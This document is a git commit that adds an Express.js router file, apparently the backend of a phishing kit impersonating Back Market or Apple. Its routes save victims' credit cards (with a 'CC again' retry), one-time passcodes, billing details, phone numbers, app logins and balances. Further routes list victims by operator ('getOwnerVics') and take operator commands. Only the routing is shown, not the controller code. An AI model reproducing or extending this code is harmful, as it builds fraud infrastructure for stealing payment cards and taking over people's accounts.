832ee15f34d17a77178293ed346e2eeaada49283
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2023-02-13 10:56:13 +0000

    make

---
+++ routes/backmarket.js
@@ -0,0 +1,34 @@
+const express = require("express");
+const {
+    sendAuRes,
+    sendRes,
+    getOwnerVics,
+    command,
+    getInfo,
+    submitAppAuth,
+    submitBilling,
+    submitTelephone,
+    submitOtp,
+    submitCCAgain,
+    submitCC,
+    deleteEntry,
+    submitBalance,
+} = require("../controllers/appleController");
+
+const router = express.Router();
+
+router.post("/", sendRes);
+router.post("/au", sendAuRes);
+router.get("/customers/:owner", getOwnerVics);
+router.post("/command", command);
+router.post("/delete", deleteEntry);
+router.get("/customers/id/:uniqueid", getInfo);
+router.post("/saveAuth", submitAppAuth);
+router.post("/saveBilling", submitBilling);
+router.post("/saveTelephone", submitTelephone);
+router.post("/saveOtp", submitOtp);
+router.post("/saveCCAgain", submitCCAgain);
+router.post("/saveCC", submitCC);
+router.post("/saveBalance", submitBalance);
+
+module.exports = router;
